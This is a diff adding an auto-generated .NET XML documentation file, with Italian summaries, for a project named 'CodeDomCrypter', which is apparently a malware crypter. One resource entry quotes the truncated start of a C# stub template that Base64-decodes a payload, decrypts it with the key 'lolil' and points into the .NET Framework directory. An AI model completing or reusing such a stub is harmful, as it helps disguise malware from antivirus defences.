@@ -1,0 +1,50 @@
+﻿<?xml version="1.0"?>
+<doc>
+<assembly>
+<name>
+CodeDomCrypter
+</name>
+</assembly>
+<members>
+<member name="P:WindowsApplication1.My.Resources.Resources.ResourceManager">
+	<summary>
+  Restituisce l'istanza di ResourceManager nella cache utilizzata da questa classe.
+</summary>
+</member><member name="P:WindowsApplication1.My.Resources.Resources.Culture">
+	<summary>
+  Esegue l'override della proprietà CurrentUICulture del thread corrente per tutte le
+  ricerche di risorse eseguite utilizzando questa classe di risorse fortemente tipizzata.
+</summary>
+</member><member name="P:WindowsApplication1.My.Resources.Resources.source">
+	<summary>
+  Cerca una stringa localizzata simile a 
+using System;
+using System.Collections;
+using System.Collections.Generic;
+using Microsoft.Win32;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.IO;
+using System.Text;
+using System.Windows.Forms;
+
+namespace zazzo
+{
+static class adwadw
+{
+ 
+    public static void Main()
+    {
+
+
+	    string %10% = "msgoff";
+       byte[] %4% = %01%(Convert.FromBase64String(%3%), "lolil");
+		string %64% = Environment.GetEnvironmentVariable("windir") + @"\Microsoft.Net\Framewor [stringa troncata]";.
+</summary>
+</member><member name="T:WindowsApplication1.My.Resources.Resources">
+	<summary>
+  Classe di risorse fortemente tipizzata per la ricerca di stringhe localizzate e così via.
+</summary>
+</member>
+</members>
+</doc>
